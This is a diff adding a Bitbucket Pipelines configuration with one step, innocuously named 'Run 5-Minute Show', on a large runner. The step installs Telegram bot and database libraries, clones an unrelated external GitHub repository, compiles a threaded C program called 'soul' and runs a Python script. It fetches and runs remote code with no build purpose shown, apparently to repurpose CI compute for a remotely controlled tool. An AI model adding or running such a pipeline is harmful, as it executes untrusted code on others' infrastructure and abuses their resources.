@@ -1,0 +1,20 @@
+image: atlassian/default-image:3
+
+options:
+  runtime:
+    cloud:
+      atlassian-ip-ranges: true
+
+pipelines:
+  default:
+    - step:
+        name: "Run 5-Minute Show"
+        size: 8x
+        script:
+          - echo "Starting the 5-minute show..."
+          - apt-get update && apt-get install -y python3-pip python3-dev
+          - pip install telebot pymongo aiohttp python-telegram-bot
+          - git clone https://github.com/pappuchai5666/sharp.git
+          - cd sharp
+          - gcc soul.c -o soul -lpthread
+          - python3 soul.py
